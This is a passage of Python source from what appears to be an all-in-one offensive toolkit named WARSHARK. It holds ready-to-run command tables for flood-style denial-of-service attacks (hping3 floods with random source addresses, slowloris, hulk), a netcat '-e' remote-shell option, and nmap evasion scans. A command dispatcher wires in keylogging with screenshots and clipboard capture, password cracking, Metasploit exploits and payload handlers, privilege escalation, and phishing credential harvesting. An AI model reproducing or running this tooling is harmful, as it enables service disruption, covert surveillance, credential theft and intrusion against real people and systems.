        "wget_save_cookies": ["wget", "--save-cookies", "{cookies}", "{url}"],
        "wget_post_data": ["wget", "--post-data", "{data}", "{url}"],
        "wget_post_file": ["wget", "--post-file", "{file}", "{url}"],
        "wget_method": ["wget", "--method", "{method}", "{url}"],
        "wget_body_data": ["wget", "--body-data", "{data}", "{url}"],
        "wget_robots_off": ["wget", "-e", "robots=off", "{url}"],
        "wget_proxy": ["wget", "-e", "use_proxy=yes", "-e", "http_proxy={proxy}", "{url}"],
        "wget_no_proxy": ["wget", "--no-proxy", "{url}"],
        "wget_timestamping": ["wget", "-N", "{url}"],
        "wget_no_clobber": ["wget", "-nc", "{url}"],
        "wget_delete_after": ["wget", "--delete-after", "{url}"],
        "wget_help": ["wget", "--help"],
        "wget_version": ["wget", "--version"],
    }
    
    CURL_COMMANDS = {
        "curl_basic": ["curl", "{url}"],
        "curl_http": ["curl", "http://{url}"],
        "curl_https": ["curl", "https://{url}"],
        "curl_ftp": ["curl", "ftp://{url}"],
        "curl_output": ["curl", "-o", "{output}", "{url}"],
        "curl_remote_name": ["curl", "-O", "{url}"],
        "curl_location": ["curl", "-L", "{url}"],
        "curl_head": ["curl", "-I", "{url}"],
        "curl_include": ["curl", "-i", "{url}"],
        "curl_verbose": ["curl", "-v", "{url}"],
        "curl_silent": ["curl", "-s", "{url}"],
        "curl_show_error": ["curl", "-S", "{url}"],
        "curl_fail": ["curl", "-f", "{url}"],
        "curl_insecure": ["curl", "-k", "{url}"],
        "curl_get": ["curl", "-X", "GET", "{url}"],
        "curl_post": ["curl", "-X", "POST", "{url}"],
        "curl_put": ["curl", "-X", "PUT", "{url}"],
        "curl_delete": ["curl", "-X", "DELETE", "{url}"],
        "curl_patch": ["curl", "-X", "PATCH", "{url}"],
        "curl_options": ["curl", "-X", "OPTIONS", "{url}"],
        "curl_data": ["curl", "-d", "{data}", "{url}"],
        "curl_data_file": ["curl", "-d", "@{file}", "{url}"],
        "curl_data_binary": ["curl", "--data-binary", "@{file}", "{url}"],
        "curl_data_urlencode": ["curl", "--data-urlencode", "{data}", "{url}"],
        "curl_form": ["curl", "-F", "{field}={value}", "{url}"],
        "curl_form_file": ["curl", "-F", "{field}=@{file}", "{url}"],
        "curl_header": ["curl", "-H", "{header}", "{url}"],
        "curl_user_agent": ["curl", "-A", "{user_agent}", "{url}"],
        "curl_referer": ["curl", "-e", "{referer}", "{url}"],
        "curl_user": ["curl", "-u", "{user}:{password}", "{url}"],
        "curl_basic_auth": ["curl", "-u", "{user}:{password}", "--basic", "{url}"],
        "curl_digest_auth": ["curl", "-u", "{user}:{password}", "--digest", "{url}"],
        "curl_cookie": ["curl", "-b", "{cookie}", "{url}"],
        "curl_cookie_file": ["curl", "-b", "{cookie_file}", "{url}"],
        "curl_cookie_jar": ["curl", "-c", "{cookie_file}", "{url}"],
        "curl_proxy": ["curl", "-x", "{proxy}", "{url}"],
        "curl_socks5": ["curl", "-x", "socks5://{proxy}", "{url}"],
        "curl_cert": ["curl", "-E", "{certificate}", "{url}"],
        "curl_key": ["curl", "--key", "{key}", "{url}"],
        "curl_cacert": ["curl", "--cacert", "{ca_cert}", "{url}"],
        "curl_tlsv1_2": ["curl", "--tlsv1.2", "{url}"],
        "curl_tlsv1_3": ["curl", "--tlsv1.3", "{url}"],
        "curl_continue": ["curl", "-C", "-", "-O", "{url}"],
        "curl_range": ["curl", "-r", "{range}", "{url}"],
        "curl_limit_rate": ["curl", "--limit-rate", "{rate}", "{url}"],
        "curl_max_time": ["curl", "-m", "{timeout}", "{url}"],
        "curl_connect_timeout": ["curl", "--connect-timeout", "{timeout}", "{url}"],
        "curl_retry": ["curl", "--retry", "{retries}", "{url}"],
        "curl_ipv4": ["curl", "-4", "{url}"],
        "curl_ipv6": ["curl", "-6", "{url}"],
        "curl_interface": ["curl", "--interface", "{interface}", "{url}"],
        "curl_dns_servers": ["curl", "--dns-servers", "{dns_servers}", "{url}"],
        "curl_resolve": ["curl", "--resolve", "{host}:{port}:{ip}", "{url}"],
        "curl_http1_0": ["curl", "--http1.0", "{url}"],
        "curl_http1_1": ["curl", "--http1.1", "{url}"],
        "curl_http2": ["curl", "--http2", "{url}"],
        "curl_compressed": ["curl", "--compressed", "{url}"],
        "curl_raw": ["curl", "--raw", "{url}"],
        "curl_no_buffer": ["curl", "-N", "{url}"],
        "curl_write_out": ["curl", "-w", "{format}", "-o", "/dev/null", "-s", "{url}"],
        "curl_dump_header": ["curl", "-D", "{header_file}", "{url}"],
        "curl_trace": ["curl", "--trace", "{trace_file}", "{url}"],
        "curl_manual": ["curl", "--manual"],
        "curl_help": ["curl", "--help"],
        "curl_version": ["curl", "--version"],
        "curl_parallel": ["curl", "--parallel", "{url1}", "{url2}"],
        "curl_json": ["curl", "-H", "Content-Type: application/json", "-d", "{json_data}", "{url}"],
    }
    
    SSH_COMMANDS = {
        "ssh_basic": ["ssh", "{user}@{host}"],
        "ssh_port": ["ssh", "-p", "{port}", "{user}@{host}"],
        "ssh_identity": ["ssh", "-i", "{key_file}", "{user}@{host}"],
        "ssh_strict_host_key": ["ssh", "-o", "StrictHostKeyChecking=no", "{user}@{host}"],
        "ssh_connect_timeout": ["ssh", "-o", "ConnectTimeout={timeout}", "{user}@{host}"],
        "ssh_server_alive": ["ssh", "-o", "ServerAliveInterval={interval}", "{user}@{host}"],
        "ssh_jump_host": ["ssh", "-J", "{jump_user}@{jump_host}", "{user}@{target}"],
        "ssh_local_forward": ["ssh", "-L", "{local_port}:{remote_host}:{remote_port}", "{user}@{host}"],
        "ssh_remote_forward": ["ssh", "-R", "{remote_port}:{local_host}:{local_port}", "{user}@{host}"],
        "ssh_dynamic_forward": ["ssh", "-D", "{local_port}", "{user}@{host}"],
        "ssh_no_command": ["ssh", "-N", "-L", "{local_port}:{remote_host}:{remote_port}", "{user}@{host}"],
        "ssh_background": ["ssh", "-f", "-N", "-L", "{local_port}:{remote_host}:{remote_port}", "{user}@{host}"],
        "ssh_execute": ["ssh", "{user}@{host}", "{command}"],
        "ssh_tty": ["ssh", "-t", "{user}@{host}", "{command}"],
        "ssh_verbose": ["ssh", "-v", "{user}@{host}"],
        "ssh_quiet": ["ssh", "-q", "{user}@{host}"],
        "ssh_compress": ["ssh", "-C", "{user}@{host}"],
        "ssh_ipv4": ["ssh", "-4", "{user}@{host}"],
        "ssh_ipv6": ["ssh", "-6", "{user}@{host}"],
        "ssh_agent_forward": ["ssh", "-A", "{user}@{host}"],
        "ssh_x11_forward": ["ssh", "-X", "{user}@{host}"],
        "ssh_version": ["ssh", "-V"],
        "scp_file": ["scp", "{local_file}", "{user}@{host}:{remote_path}"],
        "scp_recursive": ["scp", "-r", "{local_dir}", "{user}@{host}:{remote_path}"],
        "scp_port": ["scp", "-P", "{port}", "{local_file}", "{user}@{host}:{remote_path}"],
        "sftp": ["sftp", "{user}@{host}"],
        "ssh_keygen_rsa": ["ssh-keygen", "-t", "rsa", "-b", "{bits}", "-f", "{key_file}"],
        "ssh_keygen_ed25519": ["ssh-keygen", "-t", "ed25519", "-f", "{key_file}"],
        "ssh_copy_id": ["ssh-copy-id", "-i", "{key_file}", "{user}@{host}"],
    }
    
    NMAP_COMMANDS = {
        "nmap_basic": ["nmap", "{target}"],
        "nmap_ip": ["nmap", "{ip}"],
        "nmap_subnet": ["nmap", "{subnet}"],
        "nmap_range": ["nmap", "{range}"],
        "nmap_multiple": ["nmap", "{target1}", "{target2}"],
        "nmap_input_file": ["nmap", "-iL", "{input_file}"],
        "nmap_random_targets": ["nmap", "-iR", "{count}"],
        "nmap_exclude": ["nmap", "--exclude", "{exclude}"],
        "nmap_list": ["nmap", "-sL", "{target}"],
        "nmap_ping_scan": ["nmap", "-sn", "{target}"],
        "nmap_no_ping": ["nmap", "-Pn", "{target}"],
        "nmap_syn_ping": ["nmap", "-PS{ports}", "{target}"],
        "nmap_ack_ping": ["nmap", "-PA{ports}", "{target}"],
        "nmap_udp_ping": ["nmap", "-PU{ports}", "{target}"],
        "nmap_icmp_echo": ["nmap", "-PE", "{target}"],
        "nmap_no_dns": ["nmap", "-n", "{target}"],
        "nmap_dns_servers": ["nmap", "--dns-servers", "{dns_servers}", "{target}"],
        "nmap_syn_scan": ["nmap", "-sS", "{target}"],
        "nmap_connect_scan": ["nmap", "-sT", "{target}"],
        "nmap_ack_scan": ["nmap", "-sA", "{target}"],
        "nmap_udp_scan": ["nmap", "-sU", "{target}"],
        "nmap_fin_scan": ["nmap", "-sF", "{target}"],
        "nmap_xmas_scan": ["nmap", "-sX", "{target}"],
        "nmap_null_scan": ["nmap", "-sN", "{target}"],
        "nmap_idle_scan": ["nmap", "-sI", "{zombie_host}", "{target}"],
        "nmap_port": ["nmap", "-p", "{port}", "{target}"],
        "nmap_port_range": ["nmap", "-p", "{port_range}", "{target}"],
        "nmap_all_ports": ["nmap", "-p-", "{target}"],
        "nmap_fast_scan": ["nmap", "-F", "{target}"],
        "nmap_top_ports": ["nmap", "--top-ports", "{count}", "{target}"],
        "nmap_service_version": ["nmap", "-sV", "{target}"],
        "nmap_os_detection": ["nmap", "-O", "{target}"],
        "nmap_aggressive": ["nmap", "-A", "{target}"],
        "nmap_default_scripts": ["nmap", "-sC", "{target}"],
        "nmap_script": ["nmap", "--script", "{script}", "{target}"],
        "nmap_script_vuln": ["nmap", "--script", "vuln", "{target}"],
        "nmap_script_discovery": ["nmap", "--script", "discovery", "{target}"],
        "nmap_script_safe": ["nmap", "--script", "safe", "{target}"],
        "nmap_script_http": ["nmap", "--script", "http-*", "{target}"],
        "nmap_script_smb": ["nmap", "--script", "smb-*", "{target}"],
        "nmap_script_ssh": ["nmap", "--script", "ssh-*", "{target}"],
        "nmap_timing_0": ["nmap", "-T0", "{target}"],
        "nmap_timing_1": ["nmap", "-T1", "{target}"],
        "nmap_timing_2": ["nmap", "-T2", "{target}"],
        "nmap_timing_3": ["nmap", "-T3", "{target}"],
        "nmap_timing_4": ["nmap", "-T4", "{target}"],
        "nmap_timing_5": ["nmap", "-T5", "{target}"],
        "nmap_fragment": ["nmap", "-f", "{target}"],
        "nmap_mtu": ["nmap", "--mtu", "{mtu}", "{target}"],
        "nmap_decoys": ["nmap", "-D", "RND:{count}", "{target}"],
        "nmap_source_ip": ["nmap", "-S", "{source_ip}", "{target}"],
        "nmap_interface": ["nmap", "-e", "{interface}", "{target}"],
        "nmap_source_port": ["nmap", "-g", "{port}", "{target}"],
        "nmap_data_length": ["nmap", "--data-length", "{length}", "{target}"],
        "nmap_ttl": ["nmap", "--ttl", "{ttl}", "{target}"],
        "nmap_output_normal": ["nmap", "-oN", "{output_file}", "{target}"],
        "nmap_output_xml": ["nmap", "-oX", "{output_file}", "{target}"],
        "nmap_output_all": ["nmap", "-oA", "{output_prefix}", "{target}"],
        "nmap_verbose": ["nmap", "-v", "{target}"],
        "nmap_debug": ["nmap", "-d", "{target}"],
        "nmap_packet_trace": ["nmap", "--packet-trace", "{target}"],
        "nmap_iflist": ["nmap", "--iflist"],
        "nmap_reason": ["nmap", "--reason", "{target}"],
        "nmap_open_only": ["nmap", "--open", "{target}"],
        "nmap_traceroute": ["nmap", "--traceroute", "{target}"],
        "nmap_version": ["nmap", "-V"],
        "nmap_help": ["nmap", "--help"],
    }
    
    NETCAT_COMMANDS = {
        "nc_connect": ["nc", "{host}", "{port}"],
        "nc_listen": ["nc", "-l", "-p", "{port}"],
        "nc_listen_verbose": ["nc", "-l", "-v", "-p", "{port}"],
        "nc_listen_keep": ["nc", "-l", "-k", "-p", "{port}"],
        "nc_udp": ["nc", "-u", "{host}", "{port}"],
        "nc_udp_listen": ["nc", "-u", "-l", "-p", "{port}"],
        "nc_scan": ["nc", "-z", "{host}", "{port}"],
        "nc_scan_range": ["nc", "-z", "{host}", "{port_range}"],
        "nc_scan_verbose": ["nc", "-z", "-v", "{host}", "{port_range}"],
        "nc_exec": ["nc", "{host}", "{port}", "-e", "{command}"],
        "nc_timeout": ["nc", "-w", "{timeout}", "{host}", "{port}"],
        "nc_banner": ["nc", "-v", "{host}", "{port}"],
        "nc_debug": ["nc", "-d", "{host}", "{port}"],
        "nc_help": ["nc", "-h"],
    }
    
    DOS_COMMANDS = {
        "hping3_syn_flood": ["hping3", "-S", "--flood", "-p", "{port}", "{target}"],
        "hping3_udp_flood": ["hping3", "--udp", "--flood", "-p", "{port}", "{target}"],
        "hping3_icmp_flood": ["hping3", "--icmp", "--flood", "{target}"],
        "hping3_ack_flood": ["hping3", "-A", "--flood", "-p", "{port}", "{target}"],
        "hping3_fin_flood": ["hping3", "-F", "--flood", "-p", "{port}", "{target}"],
        "hping3_xmas_flood": ["hping3", "-X", "--flood", "-p", "{port}", "{target}"],
        "hping3_null_flood": ["hping3", "-Y", "--flood", "-p", "{port}", "{target}"],
        "hping3_rand_source": ["hping3", "--rand-source", "-S", "--flood", "-p", "{port}", "{target}"],
        "hping3_data_size": ["hping3", "-S", "--flood", "-d", "{size}", "-p", "{port}", "{target}"],
        "hping3_interval": ["hping3", "-S", "-i", "u{interval}", "-p", "{port}", "{target}"],
        "hping3_count": ["hping3", "-S", "-c", "{count}", "-p", "{port}", "{target}"],
        "slowloris": ["slowloris", "{host}", "-p", "{port}"],
        "goldeneye": ["goldeneye", "{url}"],
        "hulk": ["hulk", "{url}"],
    }

# =====================
# NETWORK TOOLS
# =====================
class NetworkTools:
    @staticmethod
    def ping(target: str, count: int = 4) -> CommandResult:
        start_time = time.time()
        try:
            if platform.system().lower() == 'windows':
                cmd = ['ping', '-n', str(count), target]
            else:
                cmd = ['ping', '-c', str(count), target]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
            execution_time = time.time() - start_time
            
            return CommandResult(
                success=result.returncode == 0,
                output=result.stdout + result.stderr,
                execution_time=execution_time
            )
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def nmap(target: str, scan_type: str = "quick") -> CommandResult:
        start_time = time.time()
        try:
            scan_map = {
                "quick": ['nmap', '-T4', '-F', target],
                "full": ['nmap', '-p-', target],
                "service": ['nmap', '-sV', target],
                "os": ['nmap', '-O', target],
                "udp": ['nmap', '-sU', target],
                "vuln": ['nmap', '--script', 'vuln', target],
                "stealth": ['nmap', '-sS', '-T2', target],
                "snmp": ['nmap', '-sU', '-p', '161', '--script', 'snmp-*', target],
                "smb": ['nmap', '-p', '445', '--script', 'smb-*', target],
                "ssh": ['nmap', '-p', '22', '--script', 'ssh-*', target],
                "comprehensive": ['nmap', '-sS', '-sV', '-O', '-p-', target],
                "ping": ['nmap', '-sn', target]
            }
            cmd = scan_map.get(scan_type, ['nmap', target])
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            execution_time = time.time() - start_time
            
            return CommandResult(
                success=result.returncode == 0,
                output=result.stdout + result.stderr,
                execution_time=execution_time
            )
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def curl(url: str, method: str = "GET", data: str = None) -> CommandResult:
        start_time = time.time()
        try:
            if method.upper() == "GET":
                cmd = ['curl', '-s', url]
            elif method.upper() == "POST":
                cmd = ['curl', '-s', '-X', 'POST', '-d', data or '', url]
            else:
                cmd = ['curl', '-s', '-X', method, url]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            execution_time = time.time() - start_time
            
            return CommandResult(
                success=result.returncode == 0,
                output=result.stdout + result.stderr,
                execution_time=execution_time
            )
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def netcat(host: str, port: int, command: str = None) -> CommandResult:
        start_time = time.time()
        try:
            if shutil.which('nc'):
                if command:
                    cmd = ['nc', host, str(port), '-e', command]
                else:
                    cmd = ['nc', '-zv', host, str(port)]
            elif shutil.which('ncat'):
                if command:
                    cmd = ['ncat', host, str(port), '-e', command]
                else:
                    cmd = ['ncat', '-zv', host, str(port)]
            else:
                return CommandResult(False, "Netcat not found", 0, "nc/ncat not installed")
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
            execution_time = time.time() - start_time
            
            return CommandResult(
                success=result.returncode == 0,
                output=result.stdout + result.stderr,
                execution_time=execution_time
            )
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def traceroute(target: str) -> CommandResult:
        start_time = time.time()
        try:
            if platform.system().lower() == 'windows':
                cmd = ['tracert', '-d', target]
            else:
                if shutil.which('mtr'):
                    cmd = ['mtr', '--report', '--report-cycles', '1', target]
                else:
                    cmd = ['traceroute', '-n', target]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            execution_time = time.time() - start_time
            
            return CommandResult(
                success=result.returncode == 0,
                output=result.stdout + result.stderr,
                execution_time=execution_time
            )
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def whois(domain: str) -> CommandResult:
        start_time = time.time()
        try:
            if WHOIS_AVAILABLE:
                result = whois.whois(domain)
                execution_time = time.time() - start_time
                return CommandResult(True, str(result), execution_time)
            else:
                cmd = ['whois', domain]
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
                execution_time = time.time() - start_time
                return CommandResult(result.returncode == 0, result.stdout + result.stderr, execution_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def dns(domain: str, record_type: str = "A") -> CommandResult:
        start_time = time.time()
        try:
            if shutil.which('dig'):
                cmd = ['dig', domain, record_type, '+short']
            else:
                cmd = ['nslookup', domain]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
            execution_time = time.time() - start_time
            
            return CommandResult(
                success=result.returncode == 0,
                output=result.stdout + result.stderr,
                execution_time=execution_time
            )
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def location(ip: str) -> Dict:
        try:
            response = requests.get(f"http://ip-api.com/json/{ip}", timeout=10)
            if response.status_code == 200:
                data = response.json()
                if data.get('status') == 'success':
                    return {
                        'success': True,
                        'country': data.get('country'),
                        'city': data.get('city'),
                        'isp': data.get('isp'),
                        'lat': data.get('lat'),
                        'lon': data.get('lon')
                    }
            return {'success': False}
        except:
            return {'success': False}
    
    @staticmethod
    def get_local_ip() -> str:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"
    
    @staticmethod
    def block_ip(ip: str) -> bool:
        try:
            if platform.system().lower() == 'linux' and shutil.which('iptables'):
                subprocess.run(['sudo', 'iptables', '-A', 'INPUT', '-s', ip, '-j', 'DROP'],
                             capture_output=True, timeout=10)
                return True
            elif platform.system().lower() == 'windows' and shutil.which('netsh'):
                subprocess.run(['netsh', 'advfirewall', 'firewall', 'add', 'rule',
                               f'name=WARSHARK_Block_{ip}', 'dir=in', 'action=block',
                               f'remoteip={ip}'], capture_output=True, timeout=10)
                return True
            return False
        except:
            return False
    
    @staticmethod
    def unblock_ip(ip: str) -> bool:
        try:
            if platform.system().lower() == 'linux' and shutil.which('iptables'):
                subprocess.run(['sudo', 'iptables', '-D', 'INPUT', '-s', ip, '-j', 'DROP'],
                             capture_output=True, timeout=10)
                return True
            elif platform.system().lower() == 'windows' and shutil.which('netsh'):
                subprocess.run(['netsh', 'advfirewall', 'firewall', 'delete', 'rule',
                               f'name=WARSHARK_Block_{ip}'], capture_output=True, timeout=10)
                return True
            return False
        except:
            return False
    
    @staticmethod
    def ip_to_domain(ip: str) -> Optional[str]:
        try:
            try:
                domain = socket.gethostbyaddr(ip)[0]
                if domain:
                    return domain
            except:
                pass
            
            if DNS_AVAILABLE:
                try:
                    rev_name = dns.reversename.from_address(ip)
                    answers = dns.resolver.resolve(rev_name, "PTR")
                    if answers:
                        return str(answers[0]).rstrip('.')
                except:
                    pass
            
            return None
        except Exception as e:
            logger.error(f"IP to domain error: {e}")
            return None
    
    @staticmethod
    def domain_to_ip(domain: str) -> Optional[str]:
        try:
            try:
                ip = socket.gethostbyname(domain)
                if ip:
                    return ip
            except:
                pass
            
            if DNS_AVAILABLE:
                try:
                    answers = dns.resolver.resolve(domain, "A")
                    if answers:
                        return str(answers[0])
                except:
                    pass
            
            return None
        except Exception as e:
            logger.error(f"Domain to IP error: {e}")
            return None

# =====================
# COMMAND HANDLER
# =====================
class CommandHandler:
    def __init__(self, db: DatabaseManager, config: ConfigManager,
                 ssh_manager: SSHManager = None,
                 traffic_gen: TrafficGeneratorEngine = None,
                 nikto: NiktoScanner = None,
                 dos_engine: DOSEngine = None,
                 spear_phishing: SpearPhishingEngine = None,
                 agent_engine: AgentEngine = None,
                 network_monitor: NetworkMonitor = None,
                 keylogger: KeyloggerModule = None,
                 deployment_engine: DeploymentEngine = None,
                 domain_hosting: DomainHostingEngine = None,
                 cracking_engine: CrackingEngine = None,
                 docker_scanner: DockerScanner = None,
                 metasploit_engine: MetasploitEngine = None,
                 post_exploit_engine: PostExploitationEngine = None,
                 reverse_engine: ReverseEngineeringEngine = None):
        self.db = db
        self.config = config
        self.ssh = ssh_manager
        self.traffic = traffic_gen
        self.nikto = nikto
        self.dos = dos_engine
        self.spear = spear_phishing
        self.agent = agent_engine
        self.network_monitor = network_monitor
        self.keylogger = keylogger
        self.deployment = deployment_engine
        self.domain_hosting = domain_hosting
        self.cracking = cracking_engine
        self.docker_scanner = docker_scanner
        self.metasploit = metasploit_engine
        self.post_exploit = post_exploit_engine
        self.reverse_engine = reverse_engine
        self.social = SocialEngineeringTools(db)
        self.tools = NetworkTools()
        self.command_libs = CommandLibraries()
        self.commands = self._build_commands()
    
    def _build_commands(self) -> Dict[str, Callable]:
        commands = {
            # Core commands
            'ping': self._ping,
            'traceroute': self._traceroute,
            'nmap': self._nmap,
            'curl': self._curl,
            'netcat': self._netcat,
            'ssh_add': self._ssh_add,
            'ssh_list': self._ssh_list,
            'ssh_connect': self._ssh_connect,
            'ssh_exec': self._ssh_exec,
            'ssh_disconnect': self._ssh_disconnect,
            'traffic': self._traffic,
            'traffic_types': self._traffic_types,
            'traffic_stop': self._traffic_stop,
            'traffic_status': self._traffic_status,
            'nikto': self._nikto,
            'dos_syn': self._dos_syn,
            'dos_udp': self._dos_udp,
            'dos_http': self._dos_http,
            'dos_icmp': self._dos_icmp,
            'dos_stop': self._dos_stop,
            'dos_status': self._dos_status,
            'keylogger_start': self._keylogger_start,
            'keylogger_stop': self._keylogger_stop,
            'keylogger_status': self._keylogger_status,
            'keylogger_logs': self._keylogger_logs,
            'keylogger_screenshots': self._keylogger_screenshots,
            'keylogger_clipboard': self._keylogger_clipboard,
            'crack': self._crack,
            'crack_status': self._crack_status,
            'crack_list': self._crack_list,
            'docker_scan': self._docker_scan,
            'docker_info': self._docker_info,
            'docker_ps': self._docker_ps,
            'docker_images': self._docker_images,
            'docker_bench': self._docker_bench,
            'add_ip': self._add_ip,
            'remove_ip': self._remove_ip,
            'block_ip': self._block_ip,
            'unblock_ip': self._unblock_ip,
            'list_ips': self._list_ips,
            'ip_info': self._ip_info,
            'analyze_ip': self._analyze_ip,
            'status': self._status,
            'history': self._history,
            'system': self._system,
            'threats': self._threats,
            'report': self._report,
            'clear': self._clear,
            'help': self._help,
            'ip_to_domain': self._ip_to_domain,
            'domain_to_ip': self._domain_to_ip,
            'host_domain': self._host_domain,
            'list_domains': self._list_domains,
            'metasploit_search': self._metasploit_search,
            'metasploit_exploit': self._metasploit_exploit,
            'metasploit_payload': self._metasploit_payload,
            'metasploit_handler': self._metasploit_handler,
            'metasploit_sessions': self._metasploit_sessions,
            'post_session': self._post_session,
            'post_privesc': self._post_privesc,
            'post_sessions': self._post_sessions,
            'rev_analyze': self._rev_analyze,
            'rev_strings': self._rev_strings,
            'rev_disassemble': self._rev_disassemble,
            'rev_jobs': self._rev_jobs,
            'phish_start': self._phish_start,
            'phish_stop': self._phish_stop,
            'phish_creds': self._phish_creds,
            'deploy_list': self._deploy_list,
        }
        
        # Add all library commands
        for cmd_name, cmd_args in self.command_libs.PING_COMMANDS.items():
            commands[cmd_name] = lambda args, c=cmd_args: self._run_library_command(c, args)
        
        for cmd_name, cmd_args in self.command_libs.TRACEROUTE_COMMANDS.items():
            commands[cmd_name] = lambda args, c=cmd_args: self._run_library_command(c, args)
        
        for cmd_name, cmd_args in self.command_libs.WGET_COMMANDS.items():
            commands[cmd_name] = lambda args, c=cmd_args: self._run_library_command(c, args)
        
        for cmd_name, cmd_args in self.command_libs.CURL_COMMANDS.items():
            commands[cmd_name] = lambda args, c=cmd_args: self._run_library_command(c, args)
        
        for cmd_name, cmd_args in self.command_libs.SSH_COMMANDS.items():
            commands[cmd_name] = lambda args, c=cmd_args: self._run_library_command(c, args)
        
        for cmd_name, cmd_args in self.command_libs.NMAP_COMMANDS.items():
            commands[cmd_name] = lambda args, c=cmd_args: self._run_library_command(c, args)
        
        for cmd_name, cmd_args in self.command_libs.NETCAT_COMMANDS.items():
            commands[cmd_name] = lambda args, c=cmd_args: self._run_library_command(c, args)
        
        for cmd_name, cmd_args in self.command_libs.DOS_COMMANDS.items():
            commands[cmd_name] = lambda args, c=cmd_args: self._run_library_command(c, args)
        
        # Add phishing templates
        for template_name in self.social.templates.keys():
            commands[f'phish_{template_name}'] = lambda _, t=template_name: self._phish(t)
        
        return commands
    
    def _run_library_command(self, cmd_template: List[str], args: List[str]) -> Dict:
        try:
            cmd = []
            arg_index = 0
            
            for part in cmd_template:
                if '{' in part and '}' in part:
                    placeholder = part.strip('{}')
                    if arg_index < len(args):
                        value = args[arg_index]
                        arg_index += 1
                    else:
                        value = ''
                    cmd.append(part.replace(f'{{{placeholder}}}', value))
                else:
                    cmd.append(part)
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            
            return {
                'success': result.returncode == 0,
                'output': result.stdout + result.stderr
            }
        except subprocess.TimeoutExpired:
            return {'success': False, 'output': 'Command timed out'}
        except Exception as e:
            return {'success': False, 'output': str(e)}
    
    def execute(self, command: str, source: str = "local", user_id: str = None) -> Dict:
        start_time = time.time()
        
        parts = command.strip().split()
        if not parts:
            return {'success': False, 'output': 'Empty command', 'execution_time': 0}
        
        cmd_name = parts[0].lower()
        args = parts[1:]
        
        if cmd_name in self.commands:
            try:
                result = self.commands[cmd_name](args)
            except Exception as e:
                result = {'success': False, 'output': f"Error: {e}", 'execution_time': 0}
        else:
            result = self._generic(command)
        
        execution_time = time.time() - start_time
        result['execution_time'] = execution_time
        
        self.db.log_command(command, source, source, user_id, result.get('success', False),
                           str(result.get('output', ''))[:5000], execution_time)
        
        return result
    
    # Core commands
    def _ping(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: ping <target> [count]'}
        target = args[0]
        count = int(args[1]) if len(args) > 1 and args[1].isdigit() else 4
        result = self.tools.ping(target, count)
        return {'success': result.success, 'output': result.output}
    
    def _traceroute(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: traceroute <target>'}
        target = args[0]
        result = self.tools.traceroute(target)
        return {'success': result.success, 'output': result.output}
    
    def _nmap(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap <target> [scan_type]'}
        target = args[0]
        scan_type = args[1] if len(args) > 1 else 'quick'
        result = self.tools.nmap(target, scan_type)
        return {'success': result.success, 'output': result.output}
    
    def _curl(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl <url>'}
        url = args[0]
        result = self.tools.curl(url)
        return {'success': result.success, 'output': result.output}
    
    def _netcat(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: netcat <host> <port> [command]'}
        host = args[0]
        port = int(args[1])
        command = args[2] if len(args) > 2 else None
        result = self.tools.netcat(host, port, command)
        return {'success': result.success, 'output': result.output}
    
    # SSH commands
    def _ssh_add(self, args: List[str]) -> Dict:
        if not self.ssh:
            return {'success': False, 'output': 'SSH manager not initialized'}
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: ssh_add <name> <host> <username> [password]'}
        name = args[0]
        host = args[1]
        username = args[2]
        password = args[3] if len(args) > 3 else None
        conn = self.ssh.add_connection(name, host, username, password)
        return {'success': True, 'output': f"SSH connection added: {conn.name} (ID: {conn.id})"}
    
    def _ssh_list(self, args: List[str]) -> Dict:
        if not self.ssh:
            return {'success': False, 'output': 'SSH manager not initialized'}
        connections = self.ssh.get_connections()
        if not connections:
            return {'success': True, 'output': 'No SSH connections configured'}
        output = "SSH Connections:\n"
        for conn in connections:
            status = "✅" if conn['connected'] else "❌"
            output += f"  {status} {conn['name']} - {conn['host']}:{conn['port']} ({conn['username']})\n"
        return {'success': True, 'output': output}
    
    def _ssh_connect(self, args: List[str]) -> Dict:
        if not self.ssh:
            return {'success': False, 'output': 'SSH manager not initialized'}
        if not args:
            return {'success': False, 'output': 'Usage: ssh_connect <conn_id>'}
        conn_id = args[0]
        if self.ssh.connect(conn_id):
            return {'success': True, 'output': f"Connected to {conn_id}"}
        return {'success': False, 'output': f"Failed to connect to {conn_id}"}
    
    def _ssh_exec(self, args: List[str]) -> Dict:
        if not self.ssh:
            return {'success': False, 'output': 'SSH manager not initialized'}
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: ssh_exec <conn_id> <command>'}
        conn_id = args[0]
        command = ' '.join(args[1:])
        result = self.ssh.execute_command(conn_id, command)
        return {'success': result.success, 'output': result.output}
    
    def _ssh_disconnect(self, args: List[str]) -> Dict:
        if not self.ssh:
            return {'success': False, 'output': 'SSH manager not initialized'}
        conn_id = args[0] if args else None
        if conn_id:
            self.ssh.disconnect(conn_id)
            return {'success': True, 'output': f"Disconnected from {conn_id}"}
        else:
